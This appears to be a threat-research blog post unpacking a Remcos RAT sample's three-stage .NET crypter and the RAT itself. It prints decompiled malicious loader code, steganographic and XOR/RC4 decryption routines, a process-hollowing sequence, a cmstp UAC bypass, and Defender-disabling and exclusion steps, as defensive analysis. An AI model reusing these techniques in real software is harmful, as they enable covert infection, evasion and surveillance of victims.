---
title: "Remcos RAT 3.8.0 Pro: Unpacking a Three-Stage .NET Crypter with Image Steganography"
date: 2026-10-10
author: 0xMastEB
tags: [malware analysis, threat research, reverse engineering, remcos, rat, steganography, process hollowing, ioc, mitre attack, c2 analysis, static analysis, dynamic analysis, known-plaintext attack]
sample_sha256: 9121ef0f2d7b2cc3c887420ecb1eae214db9cb780433d11565ab8c98a6ad99ec
---

# Remcos RAT 3.8.0 Pro: Unpacking a Three-Stage .NET Crypter with Image Steganography

## Executive Summary

I picked this sample on purpose. Remcos has a reputation for being heavily packed, and I wanted to see how deep the packing actually goes. It goes deep: **three loader stages before the RAT itself**, and each stage hides the next one with a different trick.

The short version. The file you download is not Remcos. It is a .NET stub that pretends to be a Vietnamese library-management app. Hidden inside its login form is a loader that pulls stage 2 out of **the pixels of an image**. Stage 2 is a VB.NET DLL protected with SmartAssembly that pretends to be a puzzle game, and it pulls stage 3 out of **a second image** in the first stage's resources, this time with a crop, a length header and an XOR layer. Stage 3 is protected with .NET Reactor, carries Remcos as a raw encrypted blob, and injects it into a hollowed process. Only at that point do you have the actual RAT: **Remcos 3.8.0 Pro**, native C++, talking to `onetouchfromlifeto[.]ddns[.]net:4489` over TLS.

Two things are worth calling out. First, the XOR key for stage 3 was visible in the code but the **encoding** of that key was hidden behind an obfuscator proxy, so I recovered the real keystream with a **known-plaintext attack** on the PE header instead of guessing. Second, during the dynamic run the keylogger was dumping my clipboard while I was copying the filenames of the screenshots I was taking for this very writeup. That one made me stop and look at the log.

Everything below was extracted statically first, then confirmed at runtime in an isolated VM. Where something is inferred rather than proven, I say so explicitly.

> Remcos is sold by BreakingSecurity as a "remote administration tool". In practice it is one of the most widely abused commodity RATs: keylogging, screen capture, microphone recording, clipboard theft, remote shell and loader functionality, usually delivered by third-party crypters like the one analysed here.

## Sample Metadata

### Stage 1: the file you actually receive

| Field | Value |
|---|---|
| Family (final payload) | Remcos RAT 3.8.0 Pro |
| SHA256 | `9121ef0f2d7b2cc3c887420ecb1eae214db9cb780433d11565ab8c98a6ad99ec` |
| File type | PE32 (I386), GUI, .NET Framework 4 (CLR 4.0.30319), C# |
| Size | ~1.02 MiB |
| Assembly name | `uUyi` 1.0.0.0 |
| Assembly GUID | `f9b36259-630b-4999-8d7c-56a9dea36011` |
| Decoy identity | `QuanLyThuVienCaNhan` (Vietnamese: "personal library management") |
| Protector | None named; DIE heuristics flag modified managed EP + compressed/high-entropy `.text` |
| First seen | 2026-10-02 08:06 UTC (MalwareBazaar, signature RemcosRAT) |

### The full chain

| Stage | File | SHA256 | Type |
|---|---|---|---|
| 1 | `uUyi.exe` (crypter stub) | `9121ef0f2d7b2cc3c887420ecb1eae214db9cb780433d11565ab8c98a6ad99ec` | PE32, C#, .NET 4 |
| 2 | `AdvancedSokoban.dll` | `CB32DBA898ACC1B7559D4518A688D37369292B5E816F9F83A5AC00BEDC682CB2` | PE32 DLL, VB.NET, SmartAssembly 8.3.7 |
| 3 | `Noogen.Validation.dll` | `C63715B4FB067CD4E140BA9F8F60ECA23E64DE53F4B0D3920D3F53816BF0E609` | PE32 DLL, C#, .NET Reactor 6.x |
| 4 | Remcos RAT 3.8.0 Pro | `3EF4C8A3489CCAEE1C746255871EFDD54CC762EA99A288B7665E9D5DA0119ADA` | PE32, native C++, MSVC 19.00 (VS2015) |

## Infection Chain Overview

```
uUyi.exe  (STAGE 1 · C# · decoy: Vietnamese library app)
 |  Main() is clean -> frmLogin -> InitializeComponent()   <-- loader hidden in UI init code
 |  resource "Qi" (Bitmap): RGB stego, 3 bytes/pixel, column-major --> 64512 bytes
 |  Assembly.Load (via InvokeMember) + Activator.CreateInstance(type, args)
 v
AdvancedSokoban.dll  (STAGE 2 · VB.NET · SmartAssembly · decoy: puzzle game)
 |  Form1..ctor(string,string,string) -> Justy()           <-- again: first line malicious, rest is decoy
 |  resource "xsam" FROM STAGE 1
 |    crop away 177 columns + 225 rows of padding -> 429 x 429
 |    ARGB stego, 4 bytes/pixel, column-major, first Int32 = payload length
 |    XOR with "gdi" (BigEndianUnicode) + per-blob byte
 v
Noogen.Validation.dll  (STAGE 3 · C# · .NET Reactor · final loader)
 |  resource "zByp" (raw byte[], 480769 bytes)
 |    XOR with "cXpEBNZbNrckf" (ASCII) + subtract next byte, then trim 1 byte
 |  process hollowing into a new instance of its own host exe
 v
Remcos RAT 3.8.0 Pro  (STAGE 4 · native C++)
 |  RCDATA resource "SETTINGS" -> RC4 -> config
 v
C2: onetouchfromlifeto[.]ddns[.]net:4489  (TLS) · botnet ONETOUCH
```

Note the pattern: **every layer uses a different hiding technique**. RGB stego, then ARGB stego plus XOR, then XOR plus subtraction, then RC4. A signature that catches one layer does not catch the next.

## Technical Analysis

### 1. Triage: reading the tool output correctly

First stop is always Detect It Easy. It reported a **.NET Framework 4 / C#** PE32, plus two heuristic flags: obfuscation (modified managed entry point) and packer (`.text` compressed + high entropy).

Two things follow from that single screen, and both decide the rest of the analysis:

**The language picks the tool.** .NET means the binary is compiled to IL, not to native x86, so IDA is the wrong tool here. dnSpy decompiles IL back to near-source C#. Knowing which tool to reach for is half the job.

**High entropy does not automatically mean "packed".** Entropy measures how random the bytes look, on a 0-8 scale. Code has low entropy because instructions repeat a lot; compressed or encrypted data has high entropy because compression removes exactly those repetitions. In a .NET assembly, **managed resources live inside the `.text` section**, and this sample carries an 87 KB PNG in there. That is what pushed the section average up, not a packer stub. I only confirmed that after finding the image.

What *was* true is that this file is not Remcos. It is a crypter stub: a wrapper that carries the real payload encrypted and unpacks it at runtime.

### 2. Stage 1: a loader hidden inside WinForms init code

The entry point is `QuanLyThuVienCaNhan.Program.Main`, and it is deliberately clean:

```csharp
Application.EnableVisualStyles();
Application.SetCompatibleTextRenderingDefault(false);
frmLogin frmLogin = new frmLogin();
bool flag = frmLogin.ShowDialog() == DialogResult.OK;
if (flag) { Application.Run(new frmMain()); }
```

Nothing suspicious. A login form, a main form. Anyone skimming the entry point moves on.

The malicious code is in `frmLogin.InitializeComponent()`, the auto-generated method that sets up buttons, labels and fonts. It is hundreds of lines of UI boilerplate, and the loader sits in the middle of it, between a label definition and the next one:

```csharp
Bitmap image = (Bitmap)componentResourceManager.GetObject("Qi");
Assembly assembly = typeof(Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, null, null, new object[]
{
    frmLogin.ThreadedDispatchExtractor.Extract(image, 64512).ToArray<byte>()
}) as Assembly;
Type type = assembly.GetTypes()[1];
string[] array = frmLogin.Way.Split(new string[] { "526164696F" }, StringSplitOptions.None);
string[] array2 = new string[] { array[1], array[3], "QuanLyThuVienCaNhan" };
object obj = Activator.CreateInstance(type, array2);
```

![Loader hidden inside InitializeComponent](/assets/img/remcos/01-dnspy-loader.png)
*Figure 1. The loader inside `InitializeComponent`, from `GetObject("Qi")` to `Activator.CreateInstance`, sandwiched between UI setup lines.*

Four details worth unpacking:

**`Assembly.Load` is called through reflection.** `typeof(Assembly).InvokeMember("Load", ...)` does the same thing as a direct call, but the API name never appears as a method reference in the metadata, only as a string. That defeats tooling that flags assemblies calling `Assembly.Load` directly.

**Load and execute are two separate steps.** `Assembly.Load(byte[])` maps the DLL in memory, straight from bytes, never touching disk (fileless). It does not run anything. The execution happens on the last line: `Activator.CreateInstance` builds an object, and building an object means running its **constructor**. That constructor is where stage 2 starts.

**The arguments come from a hex blob.** The `Way` field is a long hex string split on `526164696F`, which is hex for `Radio`, a separator that is itself a decoy. The two values it yields are `7873616D` and `676469`, which decode from hex ASCII to **`xsam`** and **`gdi`**. At this point they are just strings; stage 2 reveals what they are for.

**The type index is `[1]`.** `GetTypes()` returns types in metadata token order and skips `<Module>`, so `[1]` maps to token `0x02000003`. Cross-checking that type in stage 2 showed a constructor taking exactly three strings, matching the three arguments passed here. Index plus signature agreeing is the confirmation; the index alone would be a guess.

### 3. Stage 2: hidden in the pixels of a PNG

`Qi` is a Bitmap resource of 87,832 bytes inside `frmLogin.resources`. Opened in dnSpy it looks like coloured noise with vertical banding.

![The Qi resource rendered as an image](/assets/img/remcos/02-qi-resource.png)
*Figure 2. The `Qi` resource: 87,832 bytes of coloured noise. The vertical banding is a direct consequence of the column-major write order.*

This is **steganography**: the bytes of the next stage were written into the colour channels of an image. The extractor is `ThreadedDispatchExtractor.Extract`, obfuscated as a flattened state machine (an `Action[]` array driven by a `currentPhase` index) so the control flow reads as a jumble. Strip the machine away and the logic is four lines:

```csharp
latchedPixel = image.GetPixel(currentColumn, currentRow);  // read a pixel
harvest.Add(latchedPixel.R);                               // 1 byte
harvest.Add(latchedPixel.G);                               // 1 byte
harvest.Add(latchedPixel.B);                               // 1 byte
currentRow++;                      // move down the column
currentColumn++; currentRow = 0;   // then to the next column
```

So: **3 bytes per pixel (R, G, B, with alpha ignored), read column by column**, stopping at the 64,512-byte limit passed by the caller. That is 21,504 pixels of payload.

The same class also contains `ComputeChessEngineMetrics()`, 280 lines of chess-engine-looking code: Zobrist hashing, alpha-beta search, perft. Its return value is compared against `long.MinValue` and, if equal, calls `harvest.TrimExcess()`. It never is. It is pure junk code, there to waste an analyst's time.

I reproduced the extraction with PowerShell, using the exact same API the malware uses (`System.Drawing`, `GetPixel`), so the output is identical by construction:

```powershell
Add-Type -AssemblyName System.Drawing
$img = [System.Drawing.Bitmap]::new("$PWD\qi.png")
$out = New-Object System.Collections.Generic.List[byte]
for ($x=0; $x -lt $img.Width; $x++) { for ($y=0; $y -lt $img.Height; $y++) {
  $p = $img.GetPixel($x,$y); $out.Add($p.R); $out.Add($p.G); $out.Add($p.B) } }
$bytes = $out.GetRange(0,64512).ToArray()
[IO.File]::WriteAllBytes("$PWD\stage2.bin", $bytes)
[Text.Encoding]::ASCII.GetString($bytes,0,2)
```

Output: **`MZ`**.

![PowerShell extraction of stage 2 producing an MZ header](/assets/img/remcos/03-ps-extract-mz.png)
*Figure 3. Static extraction of stage 2 from the image. The `MZ` header is the confirmation that the pixel order, channel order and byte count were all correct.*

That two-byte check matters. `MZ` is the DOS header magic every Windows PE starts with. One wrong assumption anywhere in the extraction and you get garbage instead.

Stage 2 extracted, with the malware never executed.

### 4. Stage 2 analysed: SmartAssembly and a fake puzzle game

DIE on `stage2.bin`: **PE32 DLL, VB.NET, .NET Framework 4, protector SmartAssembly**.

VB.NET is only the source language; it compiles to the same IL as C#, which is why dnSpy still shows it as C#. SmartAssembly is a legitimate commercial .NET obfuscator (Redgate), used here to protect malware: it encrypted the string table and routed every API call through proxy delegates.

de4dot recognised it but crashed in the string decrypter (`IndexOutOfRangeException` in `ReadVariableLengthInt32`), likely a format change in this SmartAssembly build that a 2020-era tool does not know. `--strtyp none` is unsupported for this deobfuscator, so I forced the generic one:

```
de4dot.exe stage2.bin -p un
```

That renamed the symbols and cleaned the control flow. Strings stayed encrypted (the decrypter is `ns4.Class4.smethod_0(int)`, reading from an embedded resource named `{76477c1f-6442-477e-991e-89f38d94645e}`), but readable code was enough to follow the logic.

The assembly identifies as **`AdvancedSokoban` 7.4.8.0**, "Physics-enhanced puzzle box-pushing game", by "PuzzleVault Studios". Second stage, second decoy identity.

And the same structural trick as stage 1: the first line of the constructor is the malware, everything after it is the decoy:

```csharp
public Form1(string EnumCategoriesFlags, string DataMisaligned, string DirectoryInfo)
{
    Form1.Justy(EnumCategoriesFlags, DataMisaligned, DirectoryInfo);   // <-- payload
    Class2.smethod_13(this);                                           // game init from here down
    base.KeyPreview = true;
    this.comboBox_0.Items.Clear();
    ...
}
```

`Justy()` is the stage 3 loader:

```csharp
public static void Justy(string a, string b, string c)
{
    Class2.smethod_43();
    a = Class2.smethod_55(a);                    // hex decode -> "xsam"
    b = Class2.smethod_37(b);                    // hex decode -> "gdi"
    Bitmap bitmap_ = Class2.smethod_51(a, c);    // ResourceManager -> "xsam" from STAGE 1
    byte[] array = Class2.smethod_87(bitmap_);   // crop + ARGB stego
    array = Form1.Mist(array, b);                // XOR
    Assembly assembly_ = Class2.smethod_11(array);   // Assembly.Load
    Class2.smethod_26(assembly_);                    // execute stage 3
    Class2.smethod_70();
}
```

Now the three arguments make sense: **`xsam` is a resource name, `gdi` is an XOR key, and `QuanLyThuVienCaNhan` is the base name used to build the ResourceManager**. Stage 2 reaches *back into stage 1's resources* to fetch its own payload, so the carrier never travelled with the DLL.

Checking stage 1 again confirmed it: `QuanLyThuVienCaNhan.Properties.Resources` contains `ProjectedW` (5,940 bytes, a small book image, almost certainly a legitimate asset of the decoy app) and **`xsam`, 836,558 bytes**. Big enough to hold a real payload.

### 5. Stage 3 extraction: crop, ARGB, length header, XOR

`xsam` uses a different extraction scheme from `Qi`. Three transformations, all readable in the code once you follow the call chain:

**Crop.** `smethod_87` calls `RestoreOriginalBitmap(bitmap, 177, 225)`, which builds a new bitmap of `width-177` by `height-225` and copies from (0,0). The 177 right-hand columns and 225 bottom rows are **padding**, decoy pixels. In the rendered resource they are visible as a separate noise block at the bottom right. After the crop: 429 x 429, square.

**ARGB stego with a length prefix.** `smethod_41` reads `n x n` pixels column-major, converts each with `Color.ToArgb()` and stores **4 bytes per pixel** (alpha included this time). Then:

```csharp
int num3 = BitConverter.ToInt32(array, 0);   // first 4 bytes = payload length
byte[] array2 = new byte[num3];
Buffer.BlockCopy(array, 4, array2, 0, num3); // payload starts at offset 4
```

The reasoning here is simple: when a value read out of the data is used to **size an array**, it is a length. The copy starting at offset 4 confirms those first four bytes are a header, not payload. For this blob the length is **733,697 bytes**.

**XOR.** `Mist` then does:

```csharp
byte[] array = Delegate1.delegate1_1(Delegate0.delegate0_0(), key);  // Encoding.???.GetBytes("gdi")
int num = (int)(data[data.Length - 1] ^ 112);                        // per-blob byte
array2[i] = (byte)((int)data[i] ^ num ^ (int)array[num2]);
num2 = ((num2 == Delegate2.delegate2_1(key) - 1) ? 0 : (num2 + 1));  // wraps on key.Length = 3
```

Note the key index wraps on `key.Length` (3 characters), **not** on the byte length of the encoded key. That detail turns out to matter.

### 6. Known-plaintext attack on the XOR key

Running the full extraction with UTF-8 `"gdi"` produced a payload starting with `*Y` instead of `MZ`. The extraction was right (the crop was square, the length was sane), so the error had to be in the key.

The problem is that `Delegate0.delegate0_0()` is a SmartAssembly proxy. I could see that it returns an `Encoding`, but not **which one**. UTF-8 gives `67 64 69`; UTF-16LE gives `67 00 64 00 69 00`; UTF-16BE gives `00 67 00 64 00 69`. Three candidates.

Rather than brute-forcing, I recovered the keystream directly. XOR is reversible, so with two of the three terms you get the third:

```
ciphertext = plaintext XOR key
key        = ciphertext XOR plaintext
```

And the plaintext is known: every Windows PE starts with the same header bytes, `4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00`. That is a **known-plaintext attack**.

```powershell
$exp = 0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00
(0..15 | % { '{0:X2}' -f ($data[$_] -bxor $x0 -bxor $exp[$_]) }) -join ' '
```

Output:

```
00 67 00 00 67 00 00 67 00 00 67 00 00 67 00 00
```

A keystream repeating every 3 bytes: `00 67 00`. That matches **`BigEndianUnicode("gdi")` = `00 67 00 64 00 69`**, and because the index wraps on the character count (3) rather than the byte count (6), only the first three bytes are ever used. The obfuscator hid which encoding was used; the data gave it up anyway.

Re-running with the correct encoding produced **`MZ`**.

![Recovered keystream and stage 3 MZ header](/assets/img/remcos/04-ps-stage3-xor-mz.png)
*Figure 4. Known-plaintext attack: XORing the encrypted data against the expected PE header recovers the keystream `00 67 00`, which identifies the encoding as BigEndianUnicode. The corrected XOR yields `MZ`.*

### 7. Stage 3: .NET Reactor, and the loader in the clear

DIE on `stage3.bin`: **PE32 DLL, C#, .NET Framework 4, protector .NET Reactor 6.x [Control Flow, Anti-ILDASM]**, plus a generic cryptor heuristic and a curious **1-byte overlay** at `0x000b3200`.

Still not Remcos. Third loader.

The assembly identifies as **`Noogen.Validation` 12.7.5.0**, a benign-sounding library name (I did not verify whether a real library by that name exists). The entry class is decorated to match: `PatternName`, `ErrorMessage`, `Pattern`, `TestValue`, and it reads like a validation-rules class. The `using` block gives it away though: `Microsoft.Win32` and `System.Threading` have no business in a string validator.

de4dot handles .NET Reactor poorly, so I used **NETReactorSlayer**:

```
[INFO] 270 Equations resolved.
[WARN] Couldn't find anti tamper method.
[WARN] Couldn't find anti debugger method.
[INFO] 1055 Proxied calls fixed.
[INFO] 110 Strings decrypted.
[INFO] 19 Calls to obfuscator types removed.
[INFO] 44 Methods inlined.
[INFO] Saved to: stage3_Slayed.bin
```

Two things to take from that log. The useful part: 1,055 proxied calls restored and 110 strings decrypted means the code becomes properly readable. The part that goes straight into the anti-analysis table: **no anti-tamper and no anti-debugger method found**.

One practical note: Slayer renumbers metadata tokens when it inlines and removes methods, so a token noted in the original file does not point at the same method in the cleaned one. From that point on I located methods by **signature**, not by token.

Entry into this stage, as called from stage 2:

```csharp
Type t       = assembly.GetTypes()[7];   // token 0x02000009
MethodInfo m = t.GetMethods()[17];
m.Invoke(null, null);                    // null target = static, no parameters
```

#### The orchestrator

The cleaned file shows the whole flow in one method (`smethod_14` in Slayer's naming):

```
Sleep 5000 ms                                        <-- time-based sandbox evasion
if int_11 == 1 -> extra sleep of string_7[35] seconds
own path = Assembly.GetEntryAssembly().Location
admin = IsInRole(Administrator)

if int_2 == 1 && !admin -> UAC BYPASS via cmstp, then relaunch
else:
  if string_7[41] == 1 && admin -> HKLM\...\Windows Defender  DisableAntiSpyware = 1
  if int_7 == 1 -> mutex "VDSAljtEwsSW" + watchdog thread
  if int_8 == 1 -> fake error MessageBox (social engineering)
  if int_6 == 1 -> powershell "Add-MpPreference -ExclusionPath <own path>"
  if int_3 == 1 -> WebClient.DownloadFile(<url> -> %TEMP%\<name>)
  byte_0 = decrypt(resource "zByp", "cXpEBNZbNrckf")          <-- REMCOS
  if int_0 == 4 -> Assembly.Load(byte_0) + EntryPoint.Invoke  (managed, in-memory)
  else          -> PROCESS HOLLOWING into target(int_0)
```

This is a feature-rich loader, but **almost every flag is 0 in this build**. Present in code and disabled by config: UAC bypass, Defender disable, Defender exclusion, mutex/watchdog, fake messagebox, downloader. Only the default path runs: sleep 5 seconds, decrypt, hollow.

That distinction, *capability present* versus *capability enabled*, is worth keeping separate in a report. The code tells you what the builder can do; the config tells you what this particular sample does.

#### The configuration string

```
"0||0||0||0||0||||||0||0||0||0||||||||||||||0||0||0||0||0||0||0||0||4.0||2||7812||1||0||||||0||0||1||2||0||auto||0||.exe||0||0||"
```

Split on `||`, with the index-to-field mapping recovered from how the orchestrator consumes it:

| Index | Value | Field |
|---|---|---|
| 0 | 0 | injection target selector (0=self, 1=MSBuild, 2=vbc, 3=RegSvcs; 4 = managed in-memory) |
| 4 | 0 | enable web download |
| 5 |  | download URL (empty) |
| 6 |  | downloaded filename (empty) |
| 9 | 0 | `Add-MpPreference` Defender exclusion |
| 28 | 0 | mutex + watchdog thread |
| 29 | 0 | fake MessageBox |
| 30, 31 |  | messagebox text / caption |
| 34 | 0 | extra sleep enable (`[35]` = seconds) |
| 40 | 0 | UAC-bypass-if-not-admin |
| 41 |  | disable Defender if admin |

The `4.0 || 2 || 7812 || 1` region looks like builder metadata (`4.0` being a config version). **`7812` is not the C2 port**: the real port is 4489 and lives in the Remcos config, not here. It would have been an easy thing to assume and get wrong.

Other hardcoded values: `string_8 = "DCw"` (purpose unknown) and `string_9 = "VDSAljtEwsSW"` (loader mutex name, only used when the mutex flag is on).

![Stage 3 config string and runtime API table](/assets/img/remcos/05-stage3-config-apis.png)
*Figure 5. The loader configuration string and the start of the runtime-resolved API table, after NETReactorSlayer restored the proxied calls.*

#### Process hollowing

The API table in the static constructor is unambiguous once the proxies are gone:

```csharp
delegate0_0 = smethod_5<Delegate0>("kernel32", "ResumeThread");
delegate1_0 = smethod_5<Delegate1>("kernel32", "Wow64SetThreadContext");
delegate2_0 = smethod_5<Delegate2>("kernel32", "SetThreadContext");
delegate3_0 = smethod_5<Delegate3>("kernel32", "Wow64GetThreadContext");
delegate4_0 = smethod_5<Delegate4>("kernel32", "GetThreadContext");
delegate5_0 = smethod_5<Delegate5>("kernel32", "VirtualAllocEx");
delegate6_0 = smethod_5<Delegate6>("kernel32", "WriteProcessMemory");
delegate7_0 = smethod_5<Delegate7>("kernel32", "ReadProcessMemory");
delegate8_0 = smethod_5<Delegate8>("ntdll",    "ZwUnmapViewOfSection");
delegate9_0 = smethod_5<Delegate9>("kernel32", "CreateProcessA");
```

Every one of these is resolved at runtime via `LoadLibraryA` + `GetProcAddress` + `Marshal.GetDelegateForFunctionPointer`, so none of them appears in the managed metadata as an imported call.

That set of APIs **is** process hollowing. The sequence in `smethod_6`:

1. `CreateProcessA` with flags `134217732` = `CREATE_NO_WINDOW | CREATE_SUSPENDED`, start the target frozen
2. `GetThreadContext` to read the PEB pointer out of the suspended thread
3. `ZwUnmapViewOfSection` to **unmap the legitimate image** from the target
4. `VirtualAllocEx` with `PAGE_EXECUTE_READWRITE` (0x40) at the payload's preferred base
5. `WriteProcessMemory` for the headers, then section by section
6. patch the PEB `ImageBase` and set `EAX` to the new entry point via `SetThreadContext`
7. `ResumeThread`, the process wakes up running Remcos

The whole thing is wrapped in a 5-iteration retry loop. The PE parsing is manual: `e_lfanew` at offset 60, section table at `+248`, 40 bytes per section header.

The injection target comes from config index 0:

```
0 -> own path (GetEntryAssembly().Location)   <-- THIS SAMPLE
1 -> <RuntimeDir>\MSBuild.exe
2 -> <RuntimeDir>\vbc.exe
3 -> <RuntimeDir>\RegSvcs.exe
```

This build injects into **a fresh instance of its own host executable**. The other three options are signed .NET Framework binaries, the usual living-off-the-land targets.

#### UAC bypass via cmstp (present, disabled)

Not enabled in this config, but fully implemented, and interesting enough to document (**T1218.003**):

```csharp
public static string smethod_18(string line)
{
    sb.Append("C:\\windows\\temp");
    sb.Append("\\");
    sb.Append(Path.GetRandomFileName().Split('.')[0]);
    sb.Append(".inf");
    StringBuilder inf = new StringBuilder(string_15);
    inf.Replace("LINE", line);
    File.WriteAllText(sb.ToString(), inf.ToString());
    return sb.ToString();
}
```

`string_15` is a fake INF masquerading as a **"Microsoft Visual C++ Runtime Update v14.38.33135.0 - Security Patch"**, complete with a Microsoft copyright line. It declares `ServiceName = "LordVPN"`, `TermCmd = "taskkill"`, `SelfProc = "cmstp.exe"`, and writes under `SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE`.

Then:

```csharp
ShellExecute(..., "c:\\windows\\system32\\cmstp.exe", "/au <inf>", ...);
Thread.Sleep(20000);
IntPtr hwnd = FindWindow(null, "LordVPN");
PostMessage(hwnd, 256U, 13, 0);      // WM_KEYDOWN, VK_RETURN
```

`cmstp.exe` is a signed Microsoft binary that auto-elevates. Feeding it a crafted INF gets commands executed elevated without a UAC prompt; the `FindWindow` + `PostMessage` pair presses Enter on the dialog cmstp shows, so nothing is visible to the user.

![Hollowing API table and the fake Microsoft INF](/assets/img/remcos/06-stage3-hollowing-cmstp.png)
*Figure 6. The full hollowing API table, ending with `ZwUnmapViewOfSection` and `CreateProcessA`, followed by the fake "Microsoft Visual C++ Runtime Update" INF template used for the cmstp UAC bypass.*

#### Decrypting Remcos

The payload is the resource **`zByp`**: a raw `byte[]` of 480,769 bytes. No steganography this time, a third technique for a third layer.

```csharp
public static byte[] smethod_13(byte[] data, string key)
{
    byte[] k = Encoding.ASCII.GetBytes(key);        // "cXpEBNZbNrckf"
    for (int i = 0; i <= data.Length; i++)
    {
        int n  = i % data.Length;
        int n2 = (i + 1) % data.Length;
        int v  = data[n] ^ k[i % k.Length];
        data[n] = (byte)((v - data[n2] + 256) % 256);
    }
    Array.Resize(ref data, data.Length - 1);
    return data;
}
```

No known-plaintext needed here: Slayer had already decrypted the key string and the encoding is plainly `Encoding.ASCII`.

Two details. The loop condition is `i <= Length`: at `i == Length` the modulo wraps the index back to 0, so byte 0 gets processed twice. It is not an out-of-bounds read. And each byte depends on **the byte after it**, which makes this more than a plain XOR: a known-plaintext attack on the header alone would not recover the key here, because the subtraction chains every output byte to neighbouring data. You have to read the algorithm.

The final `Array.Resize(len - 1)` explains the **1-byte overlay DIE reported on stage 3**: the builder appends one extra byte that the decryptor strips.

Reimplemented in PowerShell, the output starts with `MZ`.

### 8. Stage 4: Remcos RAT

DIE on `stage4_remcos.bin`: **PE32, I386, GUI, 469.50 KiB, MSVC 19.00.24245 (VS2015), LTCG/C++, no packer**.

Native C++ at last, and no protector of any kind, so now IDA is the right tool.

Family confirmation from strings:

```
Remcos Agent initialized
Remcos restarted by watchdog!
 * Remcos v
 * BreakingSecurity.net
SETTINGS
licence
license_code.txt
```

![Remcos family indicator strings](/assets/img/remcos/07-remcos-strings.png)
*Figure 7. Family indicators in the decrypted payload. `BreakingSecurity.net` is the vendor that sells Remcos; `SETTINGS` is the name of the configuration resource.*

**Version.** The banner string is `" * Remcos v"` with no version attached, so I followed its cross-reference in IDA:

```c
AllocConsole();
hWnd = GetConsoleWindow();
if (!a1) ShowWindow(hWnd, 0);              // hidden console
strcat(Destination, " * Remcos v");
strcat(Destination, "3.8.0 Pro");
strcat(Destination, "\n * BreakingSecurity.net\n");
```

**Remcos 3.8.0 Pro**, concatenated at runtime. Worth noting: a 2026 crypter delivering an older Remcos build. The wrapper gets updated to evade detection; the RAT inside does not need to be.

#### The configuration, and how to get the C2 out of it

Remcos stores its configuration in an **RCDATA resource named `SETTINGS`**, 1,340 bytes here, encrypted with RC4. I found the resource name in the strings, and the format itself is documented publicly by other researchers, which I treated as a hypothesis to verify, not as a fact:

```
[1 byte][N bytes          ][rest of the resource     ]
   N     RC4 key            RC4-encrypted config
```

The key ships with the data, because the malware has to decrypt its own config at startup. That is the weakness: anyone who can read the resource can read the config.

I extracted it **without executing anything**, by loading the PE as pure data:

```powershell
$m = [R]::LoadLibraryExW("$PWD\stage4_remcos.bin",[IntPtr]::Zero,2)   # LOAD_LIBRARY_AS_DATAFILE
$r = [R]::FindResourceW($m,"SETTINGS",[IntPtr]10)                     # 10 = RT_RCDATA
```

`LOAD_LIBRARY_AS_DATAFILE` maps the image without running `DllMain` or any entry point: the file is treated as a blob of bytes, not as code. First byte: **163**. So the next 163 bytes are the RC4 key, and everything after that is the encrypted config.

Decrypted, the interesting fields:

| Field | Value |
|---|---|
| C2 | `onetouchfromlifeto[.]ddns[.]net : 4489 : 1` |
| Botnet / campaign ID | `ONETOUCH` |
| Install filename | `remcos.exe` |
| Install / startup name | `Remcos`, `remcos` |
| Mutex | `Rmc-9H4U4V` |
| Keylog file | `logs.dat` |
| Screenshot folder | `Screenshots` |
| Mic recording folder | `MicRecords` |
| Build/licence ID (inferred) | `9292B82F8AC01C0DB2B3C3864EDCEF58` |

The config tail carries **two DER X.509 certificates with ECDSA OIDs** (1.2.840.10045.x), validity `19700101000000Z` to `20901231000000Z`, the TLS material for the C2 channel. That explains the trailing `:1` in the C2 field, which I read as a TLS flag; the dynamic run confirmed it.

Field names here are **inferred from the values**, not from a verified index mapping of the Remcos config structure.

![Decrypted SETTINGS resource](/assets/img/remcos/08-remcos-config.png)
*Figure 8. The decrypted `SETTINGS` resource. Strings stored as UTF-16 show a null byte between characters. The C2 host, port and TLS flag are in the first field.*

#### Verifying the extraction in IDA

Reading someone else's documented format and getting plausible output is not proof. The check is whether the malware does the same thing:

```c
// load_settings_resource @ 0x419493
result = FindResourceA(hModule, "SETTINGS", (LPCSTR)0xA);   // RT_RCDATA
Resource = LoadResource(hModule, result);
v5 = LockResource(Resource);
result = SizeofResource(hModule, v3);
```

```c
// decrypt_settings_config @ 0x40DD83
keylen = SETTINGS[0];
key    = SETTINGS + 1;
data   = SETTINGS + 1 + keylen;
rc4_ksa(key, keylen);
rc4_crypt(data, size - 1 - keylen);
```

Same format, same offsets. And the two RC4 primitives are textbook:

- `rc4_ksa` @ `0x4061E3`: `S[i] = i` (SSE-vectorised init), then `j = (j + S[i] + key[i % keylen]) % 256` with a swap
- `rc4_crypt` @ `0x406252`: PRGA, `data[k] ^= S[(S[i] + S[j]) % 256]`

Small detail in the PRGA: the loop runs to `len + 1`, processing one byte past the buffer. An off-by-one in Remcos's own code.

![decrypt_settings_config in IDA](/assets/img/remcos/09-ida-settings-rc4.png)
*Figure 9. `decrypt_settings_config` in IDA: the key-length-prefixed format confirmed in the binary itself. Function names are my own annotations, the sample ships with no symbols.*

#### Capabilities

Rather than reversing 470 KB of C++ in full, I targeted specific questions.

**Keylogger**, `keylogger_install_hook` @ `0x409340`:

```c
SetWindowsHookExA(13, fn, GetModuleHandleA(0), 0);   // 13 = WH_KEYBOARD_LL
// + GetMessage loop
// error string: "Keylogger initialization failure: error"
```

`WH_KEYBOARD_LL` is a low-level keyboard hook: it sees every keystroke system-wide, regardless of which window has focus.

![Keylogger hook installation in IDA](/assets/img/remcos/10-ida-keylogger-hook.png)
*Figure 10. `SetWindowsHookExA` with hook type 13 (`WH_KEYBOARD_LL`) plus a `GetMessage` loop, a system-wide keyboard hook.*

**Persistence**, `persist_run_keys` @ `0x40B77F` writes a value under three Run locations, each gated by its own config flag:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\
```

**Other capabilities, import-level evidence only** (these functions were not traced, the imports simply support them):

| Capability | Imports |
|---|---|
| Audio capture | `waveInOpen`, `waveInStart`, `waveInAddBuffer` |
| Screen capture | `CreateCompatibleDC`, `StretchBlt`, `GetDIBits` + GDI+ encoders |
| Clipboard | `OpenClipboard`, `GetClipboardData`, `SetClipboardData` |
| Remote input | `SendInput`, `mouse_event` |
| Remote shell | `CreatePipe`, `PeekNamedPipe`, `CreateProcess` |
